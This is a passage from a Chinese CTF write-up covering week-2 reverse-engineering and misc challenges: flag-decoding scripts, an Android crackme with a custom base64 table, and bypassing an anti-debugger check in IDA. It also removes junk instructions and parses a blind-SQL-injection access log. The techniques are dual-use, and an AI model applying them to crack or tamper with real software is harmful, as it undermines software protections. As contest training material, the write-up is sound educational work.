class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i] = enc[i] ^ <span class="number">21</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001&#125;</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-REVERSE-AndroGenshin"><a href="#WEEK2-REVERSE-AndroGenshin" class="headerlink" title="WEEK2|REVERSE AndroGenshin"></a>WEEK2|REVERSE AndroGenshin</h5><p>emmm ，研究了一下午，，本来apk以前都是拖到Androidkill里，但是有时候，大的apk会卡住，提取不到源码，不是打re的，也就没有整过apk环境，</p><p>这里简单的解释一下逆向环境的问题，</p><p><code>dex2jar-2.0</code> 是逆向的  先把apk改成zip,然后选择dex里面的用dex2jar逆成jar,然后再用jdgui打开，很麻烦，而且不是很准，还是jdx好用，gui的，直接拖apk即可，适合我这种菜鸡。下载地址<code>https://github.com/skylot/jadx</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!username.equals(<span class="string">&quot;genshinimpact&quot;</span>)) &#123; <span class="comment">//username = genshinimpact</span></span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.wrong1, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] base64_table = &#123;<span class="number">125</span>, <span class="number">239</span>, <span class="number">101</span>, <span class="number">151</span>, <span class="number">77</span>, <span class="number">163</span>, <span class="number">163</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">230</span>, <span class="number">186</span>, <span class="number">206</span>, <span class="number">84</span>, <span class="number">84</span>, <span class="number">189</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">63</span>, <span class="number">104</span>, <span class="number">178</span>, <span class="number">130</span>, <span class="number">211</span>, <span class="number">164</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">193</span>, <span class="number">160</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">30</span>, <span class="number">127</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">177</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">144</span>, <span class="number">231</span>, <span class="number">250</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">91</span>, <span class="number">9</span>, <span class="number">188</span>, <span class="number">81</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">150</span>, <span class="number">40</span>, <span class="number">119</span>, <span class="number">202</span>, <span class="number">150</span>&#125;;</span><br><span class="line">    String retval = it_is_not_RC4.rc4(username, base64_table);</span><br><span class="line">    String result2 = it_is_not_base64.encode(password.getBytes(), retval);</span><br><span class="line">    <span class="keyword">if</span> (!result2.equals(<span class="string">&quot;YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1=&quot;</span>)) &#123;</span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.wrong2, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.Congratulate, <span class="number">0</span>).show();</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, MainActivity2.class);</span><br><span class="line">    MainActivity.<span class="keyword">this</span>.startActivity(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里看一下代码，username 为key，table为值，吊用it_is_not_RC4，那么就可以输出一下，用java，</p><p><img src="/images/xinshengsai/image-20231117164940894.png" alt="image-20231117164940894"></p><p>可以得到<code>BADCFEHGJILKNMPORQTSVUXWZYbadcfehgjilknmporqtsvuxwzy1032547698/+</code></p><p>这样一猜应该就是base64换表了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1=&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;BADCFEHGJILKNMPORQTSVUXWZYbadcfehgjilknmporqtsvuxwzy1032547698/+&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/image-20231117165100510.png" alt="image-20231117165100510"></p><h5 id="WEEK2-REVERSE-SMC"><a href="#WEEK2-REVERSE-SMC" class="headerlink" title="WEEK2|REVERSE SMC"></a>WEEK2|REVERSE SMC</h5><p>程序是32位的</p><p><img src="/images/xinshengsai/image-20231120112522517.png" alt="image-20231120112522517">main函数伪码，</p><p><img src="/images/xinshengsai/image-20231120104810219.png" alt="image-20231120104810219"><br>然后执行了这个函数，这个<br><img src="/images/xinshengsai/image-20231120105442011.png" alt="image-20231120105442011"></p><p>得到了一个result，他的值用shift+e拉出来就行，</p><p><img src="/images/xinshengsai/image-20231120162135987.png" alt="image-20231120162135987"></p><p>接下来是调试，解密这个函数。下断点，</p><p><img src="/images/xinshengsai/image-20231120155232948.png" alt="image-20231120155232948"></p><p>直接选中前面的点，然后在上面选中这个local debuger</p><p><img src="/images/xinshengsai/image-20231120155259699.png" alt="image-20231120155259699"></p><p>运行点yes即可，然后随便输入个字符确定，就进入了，</p><p><img src="/images/xinshengsai/image-20231120155459409.png" alt="image-20231120155459409"></p><p>这个地方是一个防止debuger的地方，我在我这个ida里调试了几次，我这里直接就zf为1，绕过这个debuger了，大佬的视频中，需要改一下绕过</p><p><img src="/images/xinshengsai/image-20231120155637467.png" alt="image-20231120155637467"></p><p>右上角中把zf改为1，大佬解释说就是if判断，1就是直接进入嘛，</p><p><img src="/images/xinshengsai/image-20231120155949184.png" alt="image-20231120155949184"></p><p>然后回到代码进行解码<code>选中按C,也就是code的意思</code>yes</p><p><img src="/images/xinshengsai/image-20231120160055370.png" alt="image-20231120160055370"></p><p>然后会把断点这块改成代码</p><p><img src="/images/xinshengsai/image-20231120160134511.png" alt="image-20231120160134511"></p><p>然后按p键让ida把这段代码转换成函数，这样就还有一点点了，</p><p><img src="/images/xinshengsai/image-20231120160305351.png" alt="image-20231120160305351"></p><p><img src="/images/xinshengsai/image-20231120160958026.png" alt="image-20231120160958026"></p><p>这样就成为了一个函数，在按tab，就能看到代码了，</p><p><img src="/images/xinshengsai/image-20231120161048660.png" alt="image-20231120161048660"></p><p>先亦或在加5</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0x82</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, <span class="number">0x6F</span>, <span class="number">0x47</span>, <span class="number">0x61</span>, <span class="number">0x57</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, </span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, <span class="number">0x84</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x68</span>, <span class="number">0x27</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>, <span class="number">0x35</span>, <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0x7E</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x71</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>( <span class="built_in">chr</span>((i - <span class="number">5</span> )^<span class="number">0x11</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;SMC_1S_1nt3r3sting!!R1ght?&#125;</span></span><br></pre></td></tr></table></figure><p>参考：<code>https://www.bilibili.com/video/BV1Cu4y1s7ab/?spm_id_from=333.999.0.0</code></p><h5 id="WEEK2-REVERSE-Petals"><a href="#WEEK2-REVERSE-Petals" class="headerlink" title="WEEK2|REVERSE Petals"></a>WEEK2|REVERSE Petals</h5><p>花指令</p><p><img src="/images/xinshengsai/image-20231121100726785.png" alt="image-20231121100726785"></p><p><img src="/images/xinshengsai/image-20231121100739187.png" alt="image-20231121100739187"></p><p><code>经典花指令，jz jnz  jz代表jump zero 为 0的时候跳转 jnz代表 jump not zero为不是0的时候跳转。代表zf 0或者1 ，那么也就是无论如何都跳转到 13B0+1 </code></p><p><img src="/images/xinshengsai/image-20231121101108265.png" alt="image-20231121101108265"></p><p>option-》general 显示机器码，</p><p><img src="/images/xinshengsai/image-20231121101137945.png" alt="image-20231121101137945"></p><p><code>13B0+1  也就是C7</code></p><p><img src="/images/xinshengsai/image-20231121101226560.png" alt="image-20231121101226560"></p><p>选中这里爆红的按U，可以把13b1 给显示出来，</p><p><img src="/images/xinshengsai/image-20231121101356497.png" alt="image-20231121101356497"></p><p>按c让这段13b0 识别成代码，</p><p><img src="/images/xinshengsai/image-20231121101556557.png" alt="image-20231121101556557"></p><p>13b0 是不会跳到里面的，但是会阻扰我们反编译，这样把0xe8改为0x90,就是让他啥也不干，按c键nop,什么也不做</p><p><img src="/images/xinshengsai/image-20231121101808634.png" alt="image-20231121101808634"></p><p>然后到程序开头的地方，按下p键，改为一个函数，在按f5    查看伪码</p><p><img src="/images/xinshengsai/image-20231121101959244.png" alt="image-20231121101959244"></p><p><img src="/images/xinshengsai/image-20231121102139568.png" alt="image-20231121102139568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xD0</span>, <span class="number">0xD0</span>, <span class="number">0x85</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xC5</span>, <span class="number">0x8A</span>, <span class="number">0x93</span>, <span class="number">0x89</span>,</span><br><span class="line">       <span class="number">0x92</span>, <span class="number">0x8F</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x9F</span>, <span class="number">0x8F</span>, <span class="number">0xC5</span>, <span class="number">0x84</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>,</span><br><span class="line">       <span class="number">0xD2</span>, <span class="number">0x82</span>, <span class="number">0xD3</span>, <span class="number">0xDE</span>, <span class="number">0x87</span>]</span><br><span class="line">v5 = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v5[i] = (~(i ^ <span class="number">25</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(v5.index((enc[i])))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(flag.encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;d780c9b2d2aa9d40010a753bc15770de&#125;</span></span><br></pre></td></tr></table></figure><p>参考<code>https://blog.csdn.net/Sciurdae/article/details/133925259</code></p><p><code>https://www.bilibili.com/video/BV13w411z7aP/?spm_id_from=333.999.0.0&amp;vd_source=0ea9fd49e9cb90fae591c5eb9cb390f4</code></p><h5 id="WEEK2-REVERSE-C？C-？"><a href="#WEEK2-REVERSE-C？C-？" class="headerlink" title="WEEK2|REVERSE C？C++？"></a>WEEK2|REVERSE C？C++？</h5><p><img src="/images/xinshengsai/image-20231121160004228.png" alt="image-20231121160004228"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">array1 = [<span class="number">68</span>,<span class="number">75</span>,<span class="number">66</span>,<span class="number">72</span>,<span class="number">99</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">78</span>,<span class="number">83</span>,<span class="number">74</span>,<span class="number">91</span>,<span class="number">86</span>,<span class="number">35</span>,<span class="number">39</span>,<span class="number">77</span>,<span class="number">85</span>,<span class="number">44</span>,<span class="number">89</span>,<span class="number">47</span>,<span class="number">92</span>,<span class="number">49</span>,<span class="number">88</span>,<span class="number">48</span>,<span class="number">91</span>,<span class="number">88</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">51</span>,<span class="number">76</span>,<span class="number">115</span>,-<span class="number">124</span>,<span class="number">125</span>,<span class="number">79</span>,<span class="number">122</span>,-<span class="number">103</span>]</span><br><span class="line">text2 = <span class="string">&quot;NEWSTAR&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    array1[i] -= i ^ -(<span class="built_in">ord</span>(text2[i]) % <span class="number">4</span>)</span><br><span class="line">    array1[i+<span class="number">7</span>] -= <span class="built_in">ord</span>(text2[i]) % <span class="number">5</span></span><br><span class="line">    array1[i+<span class="number">14</span>] -= <span class="number">2</span>*i</span><br><span class="line">    array1[i+<span class="number">21</span>] -= i^<span class="number">2</span></span><br><span class="line">    array1[i+<span class="number">28</span>] -= <span class="built_in">ord</span>(text2[i]) // <span class="number">5</span> + <span class="built_in">ord</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    array1[i] -= i</span><br><span class="line">    array1[i] += <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(array1[i]%<span class="number">256</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, </span><br><span class="line">0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, </span><br><span class="line">0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, </span><br><span class="line">0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, </span><br><span class="line">0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, </span><br><span class="line">0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, </span><br><span class="line">0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, </span><br><span class="line">0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, </span><br><span class="line">0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, </span><br><span class="line">0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, </span><br><span class="line">0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, </span><br><span class="line">0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, </span><br><span class="line">0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, </span><br><span class="line">0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, </span><br><span class="line">0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, </span><br><span class="line">0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, </span><br><span class="line">0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, </span><br><span class="line">0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, </span><br><span class="line">0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, </span><br><span class="line">0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, </span><br><span class="line">0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, </span><br><span class="line">0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, </span><br><span class="line">0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, </span><br><span class="line">0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, </span><br><span class="line">0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16</span><br></pre></td></tr></table></figure><p>input[i] = Table[(16 * (v3 + v4 % 255) &gt;&gt; 4) + 15) &amp; (v3 + v4 % 255)];</p><h5 id="WEEK2-MISC-新建Word文档"><a href="#WEEK2-MISC-新建Word文档" class="headerlink" title="WEEK2|MISC 新建Word文档"></a>WEEK2|MISC 新建Word文档</h5><p>新与佛论禅</p><p><code>http://hi.pcmoe.net/buddha.html</code></p><p>新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</p><p><img src="/images/xinshengsai/image-20231123100535460.png" alt="image-20231123100535460"></p><h5 id="WEEK2-MISC-永不消逝的电波"><a href="#WEEK2-MISC-永不消逝的电波" class="headerlink" title="WEEK2|MISC 永不消逝的电波"></a>WEEK2|MISC 永不消逝的电波</h5><p>打开是一个音频，摩斯电码，直接用morse2ascii 即可</p><p><code> morse2ascii secret.wav</code></p><p><img src="/images/xinshengsai/image-20231123101018700.png" alt="image-20231123101018700"></p><h5 id="WEEK2-MISC-1-序章"><a href="#WEEK2-MISC-1-序章" class="headerlink" title="WEEK2|MISC 1-序章"></a>WEEK2|MISC 1-序章</h5><p>sql盲注 misc 脚本</p><p>access.log</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\2023新生赛\\week2\\access.log&quot;</span>,encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">f = f.readlines()</span><br><span class="line">lists = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    s = re.findall(<span class="string">&quot;1\)\)=(.*),sl&quot;</span>,i)</span><br><span class="line">    num = re.findall(<span class="string">&quot;0user\),(.*?),1\)&quot;</span>,i)</span><br><span class="line">    <span class="comment"># lists[num[0]] = s[0]</span></span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    lists[<span class="built_in">int</span>(num[<span class="number">0</span>])]= <span class="built_in">str</span>(s[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">list</span>(lists.values()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(e)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-base"><a href="#WEEK2-MISC-base" class="headerlink" title="WEEK2|MISC base!"></a>WEEK2|MISC base!</h5><p>base64隐写，直接脚本解就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc.txt为待解密的base64隐写字符串所在的文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\2023新生赛\\week2\\base.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pattern2用于匹配两个等号情况时，等号前的一个字符</span></span><br><span class="line"><span class="comment"># pattern2用于匹配一个等号情况时，等号前的一个字符</span></span><br><span class="line">pattern2 = <span class="string">r&#x27;(\S)==$&#x27;</span></span><br><span class="line">pattern1 = <span class="string">r&#x27;(\S)=$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取后的隐写二进制字符加入binstring中</span></span><br><span class="line">binstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐行读取待解密的base64隐写字符串，逐行处理</span></span><br><span class="line"><span class="keyword">while</span>(base64str):</span><br><span class="line">    <span class="comment"># 先匹配两个等号的情况，如果匹配不上，再配置一个等号的情况</span></span><br><span class="line">    <span class="comment"># 如果无等号，则没有隐藏，无需处理</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="built_in">compile</span>(pattern2).findall(base64str):</span><br><span class="line">        <span class="comment"># mstr为等号前的一个字符，该字符为隐写二进制信息所在的字符</span></span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern2).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 确认mstr字符对应的base64二进制数，赋值给mbin</span></span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        <span class="comment"># mbin格式如0b100，mbin[0:2]为0b</span></span><br><span class="line">        <span class="comment"># mbin[2:].zfill(6)为将0b后面的二进制数前面补0，使0b后面的长度为6</span></span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># 两个等号情况隐写了4位二进制数，所以提取mbin2的后4bit</span></span><br><span class="line">        <span class="comment"># 赋值给stegobin，这就是隐藏的二进制信息</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">4</span>:]</span><br><span class="line">        binstring += stegobin</span><br><span class="line">    <span class="keyword">elif</span> re.<span class="built_in">compile</span>(pattern1).findall(base64str):</span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern1).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># 一个等号情况隐写了2位二进制数，所以提取mbin2的后2bit</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">2</span>:]</span><br><span class="line">        binstring += 